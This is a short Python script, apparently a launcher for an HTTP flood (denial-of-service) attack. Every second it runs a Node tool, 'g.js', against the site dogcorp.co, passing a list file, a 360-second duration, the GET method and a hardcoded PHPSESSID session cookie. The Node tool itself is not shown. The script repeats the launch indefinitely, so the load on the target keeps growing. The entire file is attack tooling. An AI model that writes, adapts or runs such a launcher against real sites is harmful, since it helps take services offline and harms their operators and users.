import schedule
import time
import os
import sys

os.system('node g.js http://dogcorp.co all.txt 360 GET PHPSESSID:tke1ae9s9ni1l5r6psu01rudl5')

def job():
    os.system('node g.js http://dogcorp.co all.txt 360 GET PHPSESSID:tke1ae9s9ni1l5r6psu01rudl5')
    
schedule.every(1).seconds.do(job)

while True:
    schedule.run_pending()
    time.sleep(1)
